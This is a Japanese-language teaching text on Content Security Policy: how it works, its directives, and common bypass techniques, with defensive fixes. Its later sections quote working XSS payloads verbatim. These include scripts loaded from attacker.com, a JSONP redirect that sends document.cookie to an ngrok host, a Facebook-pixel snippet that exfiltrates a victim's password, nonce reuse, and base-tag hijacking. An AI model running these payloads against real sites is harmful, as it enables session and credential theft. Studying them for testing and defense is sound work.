# CSPバイパス技法 — Content Security Policyの穴を突く

> **この節で分かること**
> - CSP（Content Security Policy）が「何のためにあり、どう動くのか」を設計意図から説明できる
> - CSPの主要ディレクティブとソース値を読み解き、危険な設定（`'unsafe-inline'`・`*`・ディレクティブ欠落）を見抜ける
> - ホワイトリストしたCDN・JSONP・オープンリダイレクト・nonce・`base-uri`欠落を突いてスクリプトを実行する典型手口を説明できる
> - スクリプトを実行できない厳格CSPでも、認証情報の窃取や情報exfiltration（外部持ち出し）が成立する経路を挙げられる
> - サーバ実装の不備（PHPの警告・CRLF）でCSPヘッダそのものを落とす攻撃を理解できる
> - csp-evaluator / cspvalidator を使って自分でCSPの弱点を診断し、防御側としてどう直すかを説明できる

**元資料**: https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques/blob/main/README.md ／ https://hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html （原典取得済み。HackTricks本体は組織egressポリシーで403だったため、公式GitHubソースから同一の一次markdownを取得）
**関連する節**: XSS（クロスサイトスクリプティング）／同一オリジンポリシー／オープンリダイレクト／dangling markup

---

## 1. CSPとは何か・なぜあるのか（設計意図）

### 1-1. CSPの定義

CSPとは、Content Security Policy（コンテンツセキュリティポリシー）の略で、Webページが「どのリソースを、どの場所から取得・実行してよいか」をブラウザに宣言する仕組みのこと。言い換えると、特定のページで、どのスクリプト・画像・iframe を、どのoriginから呼び出し・実行してよいかを決めるポリシーである。

CSPは**レスポンスヘッダ**、またはHTMLページの**`<meta>`要素**で実装する。そこから先はブラウザの責務で、ブラウザはポリシーに従い、違反を検知したら能動的にブロックする。たとえば「スクリプトは自分のドメインからしか読み込ませない」と宣言しておけば、攻撃者が外部の悪意あるスクリプトを差し込んでもブラウザ側で止まる。

> 用語メモ: origin（オリジン）とは「スキーム＋ホスト＋ポート」の組のこと。たとえば `https://example.com:443` が1つのoriginである。CSPはこのoriginを単位にリソースの読み込み元を制限する。

### 1-2. なぜCSPを使うのか

CSPはXSS（クロスサイトスクリプティング、攻撃者のJavaScriptを被害者のブラウザで実行させる攻撃）のような**コンテンツインジェクション攻撃**からWebアプリを守るために広く使われる。CSPを使うと、サーバは許可するプロトコルまで指定できる。

ここで重要な問いがある。「CSPはXSSの対策なのか？」——答えは **No** である。CSPはコンテンツインジェクションに対する**追加の防御層**であり、第一の防御線は常に出力エンコーディングと入力検証である。CSPは、XSSを完全になくすものではなく、被害を緩和する**多層防御（defense in depth）の一層**にすぎない。

CSPを正しく実装すると、脆弱性からページを守るだけでなく、（CSP自身がブロックした）失敗した攻撃の詳細まで得られる。管理者はこのレポート機能で、潜在的なバグを発見できる。

> ### 📌 ここは自分で開いて読んでください
> **資料**: HackTricks「Content Security Policy (CSP) Bypass」本体ページ — https://hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: `hacktricks.wiki`・`book.hacktricks.xyz`・`web.archive.org` はいずれも組織のegressプロキシで403ブロック）。ただし内容は同一の一次markdownを公式GitHubソースから取得済みで、本節はそれにもとづく要約である。
> **読みどころ**:
> 1. 各手法末尾の上付き参照番号から References節へ飛び、元記事（PortSwigger Research等）を辿る。
> 2. `{{#ref}}` で参照される兄弟ページ（iframes-in-xss-and-csp / abusing-service-workers / some-same-origin-method-execution / dangling-markup）。本節には self+unsafe-inline iframe版のみ収録した。
> 3. サイト側は随時更新されるため「no longer working（現在は動作しない）」注記付き手法の最新可否。
> 4. csp-evaluator / cspvalidator のライブ実行結果スクリーンショット。
> **代替手段**: 公式GitHubソース https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/content-security-policy-csp-bypass/README.md （同一内容）

---

## 2. CSPはどう動くのか（仕組み）

### 2-1. 動作の基本

CSPは、アクティブ/パッシブなコンテンツを読み込める origin を制限することで機能する。加えて、inline JavaScript（HTMLに直接書かれたスクリプト）の実行や `eval()` の使用など、アクティブコンテンツの特定の側面も制限できる。開発者は、サイトが使うリソース種別ごとに許可originをすべて定義する必要がある。

たとえば、自分が `abc.com` の所有者で、`localhost` や別ソース（例 `allowed.com`）から script/image/css を読み込む場合、非常に基本的なポリシーは次のようになる。

### 2-2. レスポンスヘッダでの実装

```text
Content-Security-policy: default-src 'self'; script-src 'self' allowed.com; img-src 'self' allowed.com; style-src 'self';
```

これは「既定は自分のドメインのみ、スクリプトは自分と `allowed.com`、画像も自分と `allowed.com`、スタイルは自分のみ」という宣言である。

### 2-3. metaタグでの実装

レスポンスヘッダを制御できない場合は、HTMLの `<head>` に `<meta>` として埋め込むこともできる。

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```

### 2-4. 2つのヘッダ名（強制と監視）

CSPには実は2つのヘッダがある。この違いは診断でも防御でも重要である。

| ヘッダ名 | 役割 |
| --- | --- |
| `Content-Security-Policy` | CSPを**強制**する。ブラウザは違反を実際にブロックする。 |
| `Content-Security-Policy-Report-Only` | **監視用**。違反をブロックせずレポートだけする。本番投入前のテストに最適。 |

`Report-Only` はブロックしないので、「テスト中のつもりで入れたら、実は強制されていなかった」という設定ミスの温床にもなる。診断では、どちらのヘッダで来ているかを必ず確認する。

### 2-5. 違反レポート（report-uri）

ポリシーには違反レポートの送信先も書ける。

```text
Content-Security-Policy: default-src 'self'; img-src https://*; child-src 'none'; report-uri /Report-parsing-url;
```

`report-uri` を設定しておくと、管理者は「攻撃者がどんなスクリプト/技法で信頼できないリソースを読ませようとしたか」を追跡できる。防御側にとっては攻撃の予兆センサーになる。

---

## 3. 主要ディレクティブ一覧

ディレクティブとは、CSPの中で「何に対する制限か」を表す項目のこと。たとえば `script-src` はスクリプトの許可元、`img-src` は画像の許可元を指定する。標的のCSPを読むときは、この一覧を手元に置いて1つずつ意味を確認するとよい。

| ディレクティブ | 何を制限するか |
| --- | --- |
| `script-src` | JavaScriptの許可ソース。`<script>` のURLだけでなく、inlineイベントハンドラ（`onclick`）やXSLT由来のスクリプト実行も含む |
| `default-src` | fetch系ディレクティブが未定義のときの既定ポリシー。多くのディレクティブがここにフォールバックする |
| `child-src` | web worker と埋め込みframe内容の許可リソース |
| `connect-src` | `<a>`・fetch・WebSocket・XMLHttpRequest 等で接続できるURLを制限 |
| `frame-src` | frameを呼び出せるURLを制限 |
| `frame-ancestors` | 現在のページを埋め込める側（`<frame>`・`<iframe>`・`<embed>`・`<applet>`）を指定。`<meta>` では使えず、非HTMLリソースにのみ適用 |
| `img-src` | 画像の許可ソース |
| `font-src` | `@font-face` で読むフォントの有効ソース |
| `manifest-src` | application manifestファイルの許可ソース |
| `media-src` | `<audio>`・`<video>`・`<track>` 等メディアの許可ソース |
| `object-src` | `<object>`・`<embed>`・`<applet>` の許可ソース |
| `base-uri` | `<base>` で設定できるURLを指定 |
| `form-action` | フォーム送信の有効エンドポイント |
| `plugin-types` | ページが呼べるMIMEタイプを制限 |
| `upgrade-insecure-requests` | HTTP URLをHTTPSへ書き換えるようブラウザに指示 |
| `sandbox` | `<iframe>` の `sandbox` 属性同様の制限を適用（ポップアップ・プラグイン・スクリプト実行の抑止、same-originの強制など） |
| `report-to` / `report-uri` | ポリシー違反時のレポート送信先 |
| `worker-src` | Worker / SharedWorker / ServiceWorker スクリプトの有効ソース |
| `prefetch-src` | fetch/prefetchされるリソースの有効ソース |
| `navigate-to` | ドキュメントが遷移できるURLを制限（`<a>`・form・`window.location`・`window.open` 等あらゆる手段） |

### 3-1. 攻撃者はディレクティブの「欠落」を狙う

攻撃者がまず見るのは、**どのディレクティブが書かれていないか**である。たとえば `object-src` が無ければ `<object>` 経由でスクリプトを持ち込めるし、`base-uri` が無ければ `<base>` タグでスクリプトの読み込み先を乗っ取れる。CSPは「書いていない部分が穴になる」設計なので、欠落の発見が第一歩になる。

---

## 4. ソース値一覧

ソース（source）とは、ディレクティブに指定する値そのもののこと。`'self'` や `*`、具体的なドメイン、`'unsafe-inline'` などが該当する。ソースの意味を正確に知らないと、危険な設定を見逃す。

| ソース値 | 意味 |
| --- | --- |
| `*` | `data:`・`blob:`・`filesystem:` スキーム以外のすべてのURLを許可 |
| `'self'` | 同一ドメインからの読み込みを許可 |
| `data:` | dataスキーム経由（例: Base64画像）のリソース読み込みを許可 |
| `'none'` | どのソースからも読み込ませない |
| `'unsafe-eval'` | `eval()` 等、文字列からコードを作る機能を許可（非推奨。名前どおり危険） |
| `'unsafe-hashes'` | 特定のinlineイベントハンドラを許可 |
| `'unsafe-inline'` | inline `<script>`・`javascript:` URL・inlineイベントハンドラ・inline `<style>` を許可（非推奨） |
| `'nonce-...'` | 暗号学的nonce（number used once、一度きりの乱数）で特定のinlineスクリプトだけをホワイトリスト。サーバはポリシー送信のたびに一意な値を生成する必要がある |
| `'sha256-<hash>'` | 特定のsha256ハッシュを持つスクリプトをホワイトリスト |
| `'strict-dynamic'` | nonce/hashで許可されたスクリプトが読み込むスクリプトを、任意ソースから許可する |
| `https:` | HTTPSを使うURLに制限 |
| `blob:` / `filesystem:` | Blob URL / filesystem からの読み込みを許可 |
| `'report-sample'` | 違反レポートに違反コードのサンプルを含める（デバッグ用） |
| `'strict-origin'` | `'self'` に似るが、プロトコルのセキュリティレベル一致を保証（secure origin は secure origin からのみ読める） |
| `'strict-origin-when-cross-origin'` | same-origin要求では完全URLを、cross-origin要求ではoriginのみを送る |
| `'unsafe-allow-redirects'` | 別リソースへ即リダイレクトするリソースの読み込みを許可（非推奨、セキュリティ低下） |

---

## 5. 明示していないディレクティブは `default-src` を継承する

CSPを読む上で最も間違えやすいのがこの継承ルールである。ある動作例を見てみよう。

```text
Content-Security-Policy: default-src 'self'; script-src https://bhaveshthakur.com; report-uri /Report-parsing-url;
```

このCSP下での挙動（原資料の解説を逐語で保存する）。

```text
<img src=image.jpg> : This image will be allowed as image is loading from same domain i.e. bhaveshthakur.com
<script src=script.js> : This script will be allowed as the script is loading from the same domain i.e. bhaveshthakur.com
<script src=https://evil.com/script.js>  : This script will not-allowed as the script is trying to load from undefined domain i.e. evil.com
"/><script>alert(1337)</script> : This will not-allowed on the page. But why? Because inline-src is set to self.
```

ポイントは最後の行にある。`inline-src` などというディレクティブは書かれていないのに、なぜinlineスクリプトが止まるのか。答えは `default-src 'self'` にある。**明示していないディレクティブは `default-src` の値を継承する**からだ。`default-src 'self'` はinlineを許可しないので、inline `<script>` はブロックされる。

### 5-1. default-srcにフォールバックするディレクティブ一覧

次のディレクティブは、自分自身が書かれていなければ `default-src` の値に従う（逐語）。

```text
child-src connect-src font-src frame-src img-src manifest-src
media-src object-src prefetch-src script-src script-src-elem
script-src-attr style-src style-src-elem style-src-attr worker-src
```

注意すべきは、この一覧に**入っていない**ディレクティブである。たとえば `form-action`・`base-uri`・`frame-ancestors` は `default-src` にフォールバック**しない**。つまり `default-src 'none'` と書いても、`form-action` を別途書かなければフォーム送信は制限されない。攻撃者はまさにここを突く（後述）。

---

## 6. 危険なCSP設定パターン（設定ミスの定番）

ここからが本題である。攻撃者は「どう突くか」を、CSPの設定ミスから逆算する。まずスクリプト実行に直結する定番の穴を見る。

### 6-1. `'unsafe-inline'` がある

`script-src` に `'unsafe-inline'` が入っていると、inlineスクリプトがそのまま通る。極めて脆弱。

脆弱なCSP:
```text
Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-inline' https://*; child-src 'none'; report-uri /Report-parsing-url;
```
動くペイロード（逐語）:
```html
"/><script>alert(1337);</script>
```

`'unsafe-inline'` は「CSPを入れているのにXSSが止まらない」典型で、実質CSPが無いのと大差ない。診断ではまずこれの有無を見る。

### 6-2. `'unsafe-eval'` がある

`'unsafe-eval'` は文字列からコードを作る機能（`eval` 等）を許す。単体では `<script>` の外部読み込みを止められても、`data:` スキームと組み合わせると回避される場合がある。

脆弱なCSP:
```text
Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-eval' data: http://*; child-src 'none'; report-uri /Report-parsing-url;
```
動くペイロード（逐語）:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

〔補足〕base64 `YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==` は `alert(document.domain)` のエンコードである。

なお `'unsafe-eval'` 単体（`data:` 無し）で `data:` の `<script>` を通すペイロードは、現在は動作しない旨がHackTricks側で注記されている（HackTricks-wiki issue #653 参照）。「昔のPoCがそのまま動くとは限らない」という好例である。

### 6-3. ワイルドカード `*` がある

`script-src` に `*` があると、ほぼ任意のドメインからスクリプトを読める。

脆弱なCSP:
```text
Content-Security-Policy: script-src 'self' https://facebook.com https://google.com https: data *; child-src 'none'; report-uri /Report-parsing-url;
```
動くペイロード（逐語）:
```html
"/>'><script src=https://attacker.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```

### 6-4. `object-src` と `default-src` が欠落

`object-src` も `default-src` も無いと、`<object>`／`<embed>` 経由でスクリプトを実行できる余地が残る。

脆弱なCSP:
```text
Content-Security-Policy: script-src 'self' report-uri /Report-parsing-url;
```
動くペイロード（逐語）:
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```

〔補足〕`PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` は `<script>alert(1)</script>` のbase64である。この `<object>` 経由の手法は、現在はもう動作しないように見える旨がHackTricks側で注記されている。

---

## 7. ホワイトリストの穴を突く

CSPを厳しくしても、「信頼して許可したドメイン」自体に穴があれば回避される。ここが実戦で最も多く成立する領域である。

### 7-1. ファイルアップロード＋`'self'`

任意種別のファイルアップロードを許すサイトなら、悪意のスクリプトをアップロードし、`'self'` として読み込ませられる。

脆弱なCSP:
```text
Content-Security-Policy: script-src 'self'; object-src 'none' ; report-uri /Report-parsing-url;
```
動くペイロード（逐語）:
```html
"/>'><script src="/user_upload/mypic.png.js"></script>
```

実務的な注意（原資料の要点を整理）:
- サーバはアップロードを検証し、特定種別しか許さないことが多い。
- 許可拡張子（例 `script.png`）の中にJSを入れても、Apache等は**拡張子でMIMEタイプを選ぶ**ため、ブラウザは画像の中身のJS実行を拒否する。ただし例外はある。あるCTFでは、Apacheが `.wave` 拡張子を知らず `audio/*` のようなMIMEで配信しないことが判明した。
- XSSとファイルアップロードが揃い、**誤解釈される拡張子**を見つけられれば、その拡張子＋スクリプト内容のファイルを上げる手がある。正しい形式を検証されるなら polyglot（複数フォーマットとして成立するファイル）を作る。

### 7-2. JSONPエンドポイントで回避

JSONPとは、`?callback=関数名` のようにURLで指定した関数名を、応答のJavaScriptがそのまま呼び出す古い仕組みのこと。callbackにコードを混ぜられると、そのドメインがXSSの発射台になる。

脆弱なCSP:
```text
Content-Security-Policy: script-src 'self' https://www.google.com; object-src 'none' ; report-uri /Report-parsing-url;
```
`'self'` ＋特定ホワイトリストドメインなら、そのドメインのJSONPで回避できる。動くペイロード（逐語）:
```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
```

同様にYouTube等のエンドポイントを悪用する例（逐語）:
```html
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
https://www.youtube.com/oembed?callback=alert;
```

`script-src` に `self` ＋許可ドメインを持つCSPを見つけたら、その許可ドメインにJSONPエンドポイントが無いか探すのが定石。既製の集約リストがJSONBeeである。さらに、信頼エンドポイントにオープンリダイレクトがあると、初期エンドポイントが信頼される以上リダイレクト先も信頼されるので、同じ脆弱性になる。

> ### 📌 ここは自分で開いて読んでください
> **資料**: JSONBee（CSP回避用JSONPエンドポイント集） — https://github.com/zigoo0/JSONBee
> **なぜ**: 本教科書の執筆環境からは全文の逐語取得を行っていない（理由: 外部リポジトリで随時更新される検索結果ベースの参照）。以下の記述は原資料の参照断片にもとづく要約である。
> **読みどころ**:
> 1. `jsonp.txt` の各サイト別JSONPエンドポイント。
> 2. どれが現在生きていて、どれが修正済みかの見分け。
> 3. 自分の標的CSPの許可ドメインと突き合わせる方法。
> **代替手段**: `jsonp.txt` 直リンク https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt

### 7-3. ホワイトリストしたCDN／AngularJS（script gadget）

ライブラリCDN（例 `cdnjs.cloudflare.com`）をホワイトリストすると、そのCDNが配る**脆弱バージョンのライブラリ**を読み込んでXSSにできる。AngularJSの古いバージョンは、`{{...}}` 式の中でサンドボックスを脱出してJSを実行できることで有名である。

> 用語メモ: script gadget（スクリプトガジェット）とは、正規のライブラリ内にある機能を悪用して、攻撃者のコードを実行させる「部品」のこと。CDNを許可しただけで、その中のガジェットまで許可してしまうのが問題の本質。

脆弱なCSP:
```text
Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com/; object-src 'none' ; report-uri /Report-parsing-url;
```
動くペイロード（逐語）:
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
 
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
 <div ng-app ng-csp>
  {{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
 </div>
"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
```

`ng-csp` 属性はAngularJSに「CSP互換モードで動け」と指示するもので、CSP環境でもガジェットが機能するよう調整するために攻撃者が付ける。

#### 7-3-1. `unsafe-eval` すら不要なAngularJSペイロード

`unsafe-eval` があればAngularガジェットは通りやすいが、注意すべきは**一部のペイロードでは `unsafe-eval` すら不要**という点である。

脆弱なCSP:
```text
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
動くペイロード（逐語）:
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
  <script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
  </script>
  <img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```

#### 7-3-2. `window`オブジェクトを返す関数を探す

より汎用的な手法として、許可されたJSライブラリ置き場から**全ライブラリを読み込み、各ライブラリの全関数を実行し、どの関数が `window` オブジェクトを返すか**を調べる、という自動化がある。`window` を握れれば `alert` や `fetch` などグローバル関数を自由に呼べる（逐語）。

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
 {{$on.curry.call().alert(1)}}
 {{[].empty.call().alert([].empty.call().document.domain)}}
 {{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{[].erase.call().alert('xss')}}
</div>
```

class名からAngularのCSTI（Client-Side Template Injection、クライアント側テンプレートインジェクション）を起こす例（逐語）:
```html
<div ng-app>
  <strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```

> ### 📌 ここは自分で開いて読んでください
> **資料**: AngularJS CSP bypass via cdnjs（blog.huli.tw） — https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/
> **なぜ**: 本教科書の執筆環境からは全文の逐語取得を行っていない（理由: 外部ブログの参照断片）。以下は原資料の参照にもとづく要約である。
> **読みどころ**:
> 1. cdnjsの全ライブラリを走査し `window` を返す関数を探す自動化の考え方。
> 2. prototype/mootools等を組み合わせたガジェットチェーンの作り方。
> 3. 具体的な `{{...}}` 式ペイロード。
> **代替手段**: なし（同著者のシリーズ記事 https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/ が近い内容）

#### 7-3-3. reCAPTCHA / Googleドメインの悪用

`https://www.google.com/recaptcha/` がCSPで許可されていると、その中のJSコードを悪用して任意JSを実行できる例がある（逐語）。

```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- Trigger alert -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />
```

さらに `www.google.com` はオープンリダイレクトを持ち、次のURLは `example.com` へリダイレクトする（逐語）。
```text
https://www.google.com/amp/s/example.com/
```

### 7-4. AngularJS＋ホワイトリストドメイン（ajax.googleapis.com）

AngularJSアプリでscript読み込みドメインをホワイトリストするCSPは、コールバック関数と脆弱クラスの呼び出しで回避できる。

脆弱なCSP:
```text
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
動くペイロード（逐語）:
```html
ng-app"ng-csp ng-click=$event.view.alert(1337)>
<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```

詳細な実戦ペイロード集は cure53 の「H5SC Minichallenge 3」にある。

> ### 📌 ここは自分で開いて読んでください
> **資料**: cure53 H5SC Minichallenge 3 "Sh*t, it's CSP!" — https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22
> **なぜ**: 本教科書の執筆環境からは全文の逐語取得を行っていない（理由: 外部Wikiの参照断片）。以下は原資料の参照にもとづく要約である。
> **読みどころ**:
> 1. AngularJSのサンドボックス脱出系ガジェット。
> 2. `ng-csp`／`ng-app` 属性の悪用。
> 3. 各AngularバージョンでのCSTIペイロード。
> 4. ホワイトリストCDN前提の実戦ペイロード集。
> **代替手段**: なし

### 7-5. AngularJSイベント（`$event.path` サンドボックス脱出）

AngularJSはブラウザ標準のJSイベントとは別に、独自のカスタムイベントを持つ。イベント内では一意オブジェクト `$event`（ネイティブのブラウザイベントを参照）が使え、Chromeでは `$event`/`event` に `path` 属性がある。この配列の末尾には必ず `window` オブジェクトが来るので、`orderBy` フィルタで配列を反復し末尾の `window` からグローバル関数を起動できる（逐語）。

```html
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```

`ng-focus` でイベントを発火させ、`$event.path|orderBy` で `path` 配列を操作し、`window` 経由で `alert()` を実行して `document.cookie` を露出させる、という流れである。

### 7-6. 2つのホワイトリスト＋オープンリダイレクトでパス制限回避

CSPはホワイトリストにパスまで書ける（例 `accounts.google.com/random/`）。だが、もう一方の許可ドメインにオープンリダイレクトがあると、そこを起点にJSONPエンドポイントを持つドメインへ飛ばせる。リダイレクト時、ブラウザはホストのみ検証しパスは検証しないため、パス制限が回避される。

脆弱なCSP:
```text
Content-Security-Policy: script-src 'self' accounts.google.com/random/ website.with.redirect.com ; object-src 'none' ; report-uri /Report-parsing-url;
```
動くペイロード（逐語）:
```html
">'><script src="https://website.with.redirect.com/redirect?url=https%3A//accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>">
```

### 7-7. リダイレクト経由でパス制限を回避

CSPがサーバ側リダイレクトに遭遇したらどうなるか。許可されない別originへのリダイレクトなら失敗する。だが CSP Level 2 の仕様「Paths and Redirects」により、**同一origin内の別パスへのリダイレクト**なら、元のパス制限を回避できる。

```html
<!DOCTYPE html>
<html>
  <head>
    <meta
      http-equiv="Content-Security-Policy"
      content="script-src http://localhost:5555 https://www.google.com/a/b/c/d" />
  </head>
  <body>
    <div id="userContent">
      <script src="https://https://www.google.com/test"></script>
      <script src="https://https://www.google.com/a/test"></script>
      <script src="http://localhost:5555/301"></script>
    </div>
  </body>
</html>
```

CSPが `https://www.google.com/a/b/c/d` の場合、パスが考慮されるので `/test` と `/a/test` はブロックされる。しかし `http://localhost:5555/301` が、サーバ側で `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//` にリダイレクトされると、リダイレクトなので**パスが考慮されず**スクリプトが読める。パスを完全指定してもリダイレクトで抜けられてしまう。最善策は、オープンリダイレクトを無くし、悪用可能ドメインをCSPに置かないことである。

### 7-8. RPO（Relative Path Overwrite、相対パス上書き）

一部サーバでは、ブラウザとサーバのURL解釈差を突ける。CSPが `https://example.com/scripts/react/` を許可する場合の回避例（逐語）:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```

ブラウザには `https://example.com/scripts/react/` 配下のファイルを読んでいるように見えCSPに準拠するが、サーバは `%2f` を `/` にデコードして `.../scripts/angular/angular.js` を返す。**ブラウザとサーバのURL解釈差**でパス規則を回避する手法である。対策は、サーバ側で `%2f` を `/` として扱わず、両者の解釈を一致させること。

---

## 8. 第三者（サードパーティ）ドメインの悪用

CSPで許可されがちな第三者サービスの多くは、データexfilやコード実行に悪用できる。SensePostの調査による代表例（表を完全再現）。

| 事業者 | 許可されがちなドメイン | 悪用能力 |
| --- | --- | --- |
| Facebook | www.facebook.com, *.facebook.com | Exfil |
| Hotjar | *.hotjar.com, ask.hotjar.io | Exfil |
| Jsdelivr | *.jsdelivr.com, cdn.jsdelivr.net | Exec |
| Amazon CloudFront | *.cloudfront.net | Exfil, Exec |
| Amazon AWS | *.amazonaws.com | Exfil, Exec |
| Azure Websites | *.azurewebsites.net, *.azurestaticapps.net | Exfil, Exec |
| Salesforce Heroku | *.herokuapp.com | Exfil, Exec |
| Google Firebase | *.firebaseapp.com | Exfil, Exec |

> 用語メモ: exfiltration（エクスフィルトレーション）とは、盗んだ情報を外部へ持ち出すこと。Exec（実行）はコード実行、Exfil（持ち出し）はデータ送信を指す。CDNやクラウドの共有ドメインは「自分でアカウントを作ってそこにファイルを置ける」ため、許可されると攻撃者の中継地点になる。

たとえば次のようなCSPを見つけたとする（逐語）:
```text
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
Facebook SDKの `fbq` を使うと、Google Analytics でよく行われるのと同様にデータをexfilできる。攻撃者はFacebook Developerアカウントを作り、「Facebook Login」アプリのApp IDを取得し、被害者ページで次を実行する（逐語）。

```javascript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
    data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```

これは「信頼できる分析基盤」を、攻撃者のダッシュボードへデータを送るトンネルに変える手口である。

---

## 9. nonce と strict-dynamic の回避

nonce方式は「サーバが毎回ランダムな値を発行し、その値を持つinlineスクリプトだけを許可する」仕組みで、`'unsafe-inline'` より安全とされる。だが**JSを少しでも実行できる状況**では回避されうる。

### 9-1. ページ内のnonceを読み出して再利用

ページ内で既に使われているnonceを `doc.defaultView.top.document.querySelector("[nonce]")` で読み出し、それを自分のスクリプト要素に付ければ、許可済みとして実行できる。次はAngularの `ng-on-error` を起点にnonceを再利用する例（逐語）。

```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img
  src="x"
  ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```

### 9-2. strict-dynamic

`'strict-dynamic'` は「nonce/hashで許可されたスクリプトが読み込むスクリプトは、どのソースからでも許可する」というソースである。したがって、許可済みのJSコードにDOM上で**新しいscriptタグ（攻撃者のコード入り）を作らせられれば**、許可済みスクリプトが作ったものとして新scriptタグの実行が許可される。9-1のようにnonceを読み出す必要すらなくなる。

---

## 10. `base-uri` 欠落を突く

`base-uri` が無いと、2つの攻撃が可能になる。1つはdangling markup injection（後述）。もう1つは、ページが**相対パスでスクリプトを読む**（例 `<script src="/js/app.js">`）際にnonceを使っている場合、`<base>` タグで基準URLを攻撃者のサーバに書き換え、そのスクリプトを自分のサーバから読ませてXSSにできる。脆弱ページがHTTPSで読まれるなら `<base>` にもHTTPS URLを使う（逐語）。

```html
<base href="https://www.attacker.com/" />
```

つまり「相対パス＋nonce＋`base-uri`欠落」の3点が揃うと、nonceで守っているつもりのスクリプト読み込みが乗っ取られる。防御としては `base-uri 'self'`（または `'none'`）を必ず明示する。

---

## 11. スクリプトを実行できなくても成立する攻撃

CSPが厳格でJavaScript実行が無理でも、攻撃は終わらない。ここが厳格CSP環境の盲点である。

### 11-1. form-action 欠落＋パスワードマネージャ

JSを注入できなくても、**form actionを注入**して、ブラウザのパスワードマネージャの自動入力を期待し、認証情報をexfilできる。重要な事実として、**`default-src` は form action をカバーしない**。したがって `default-src 'none'` でも `form-action` を書き忘れていれば穴になる。

